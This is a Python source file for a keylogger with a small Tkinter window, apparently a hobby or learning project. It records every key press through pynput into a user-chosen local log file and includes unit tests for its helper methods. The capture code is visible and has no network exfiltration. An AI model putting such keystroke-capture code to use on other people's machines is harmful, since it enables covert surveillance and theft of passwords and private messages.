import tkinter as tk
from tkinter import filedialog
from pynput.keyboard import Listener, Key
import datetime
import unittest
from unittest.mock import patch
import os


class Keylogger:
    def __init__(self):
        self.max_characters_per_line = 50
        self.current_line_length = 0
        self.current_line = []
        self.log_file_path = None  # Initialize log_file_path to None
        self.excluded_keys = [
            Key.shift,
            Key.backspace,
            Key.caps_lock,
            Key.tab,
            Key.esc,
            Key.alt_l,
            Key.scroll_lock,
            Key.pause,
            Key.print_screen,
        ]

    def generate_log_file_name(self):
        now = datetime.datetime.now()
        date_str = now.strftime("%Y-%m-%d_%H-%M-%S")
        return f"log_{date_str}.txt"

    def write_to_file(self, key):
        letter = str(key).replace("'", "")

        if key in self.excluded_keys:
            return

        if letter == 'Key.space':
            letter = ' '
        if letter == "Key.enter":
            letter = "\n"

        if key == Key.backspace:
            self.handle_backspace()

        if self.current_line_length >= self.max_characters_per_line:
            self.handle_max_characters()

        self.current_line.append(letter)
        self.current_line_length += 1

        with open(self.log_file_path, 'a') as f:
            f.write(letter)

    def handle_backspace(self):
        if self.current_line:
            self.current_line.pop()
            self.current_line_length -= 1
            with open(self.log_file_path, 'a') as f:
                f.seek(0, 2)
                f.seek(f.tell() - 1, 0)
                f.truncate()

    def handle_max_characters(self):
        with open(self.log_file_path, 'a') as f:
            f.write('\n')
        self.current_line_length = 0
        self.current_line = []

    def browse_file_path_and_start_logging(self):
        self.log_file_path = filedialog.asksaveasfilename(defaultextension=".txt")
        return self.log_file_path

    def start_listener(self):
        with Listener(on_press=self.write_to_file) as l:
            l.join()


class KeyloggerTest(unittest.TestCase):
    def test_generate_log_file_name(self):
        keylogger = Keylogger()
        log_file_name = keylogger.generate_log_file_name()
        self.assertTrue(log_file_name.startswith("log_"))
        self.assertTrue(log_file_name.endswith(".txt"))

    def test_handle_backspace(self):
        keylogger = Keylogger()
        keylogger.log_file_path = "test_log.txt"  # Set log_file_path
        keylogger.current_line = ["a", "b", "c"]
        keylogger.current_line_length = 3
        keylogger.handle_backspace()
        self.assertEqual(keylogger.current_line, ["a", "b"])
        self.assertEqual(keylogger.current_line_length, 2)

    def test_handle_max_characters(self):
        keylogger = Keylogger()
        keylogger.log_file_path = "test_log.txt"  # Set log_file_path
        keylogger.current_line_length = keylogger.max_characters_per_line + 1
        keylogger.current_line = ["a"] * keylogger.max_characters_per_line
        keylogger.handle_max_characters()
        self.assertEqual(keylogger.current_line_length, 0)
        self.assertEqual(keylogger.current_line, [])

    @patch("tkinter.filedialog.asksaveasfilename", return_value="test_log.txt")
    @patch("pynput.keyboard.Listener.join")
    def test_browse_file_path_and_start_logging(self, mock_join, mock_file_dialog):
        keylogger = Keylogger()
        log_file_path = keylogger.browse_file_path_and_start_logging()
        self.assertEqual(log_file_path, "test_log.txt")

    @patch("pynput.keyboard.Listener.join")
    def test_start_listener(self, mock_join):
        keylogger = Keylogger()
        keylogger.log_file_path = "test_log.txt"  # Set log_file_path
        keylogger.start_listener()
        mock_join.assert_called_once()


# Tkinter GUI
def browse_and_start_logging():
    keylogger = Keylogger()
    log_file_path = keylogger.browse_file_path_and_start_logging()
    if log_file_path:
        log_file_path_entry.delete(0, tk.END)
        log_file_path_entry.insert(0, log_file_path)
        keylogger.start_listener()

        
'''
if __name__ == "__main__":
    unittest.main()
'''

# Create the main window 
window = tk.Tk()
window.title("Keylogger | Created by rebika shahi")

# Set window size and make it non-resizable
window.geometry("400x150")
window.resizable(False, False)

# Create and pack widgets
log_file_path_label = tk.Label(window, text="Log File Path:")
log_file_path_label.pack()

log_file_path_entry = tk.Entry(window)
log_file_path_entry.pack()

browse_button = tk.Button(window, text="Browse and Start Logging", command=browse_and_start_logging)
browse_button.pack()

window.mainloop()
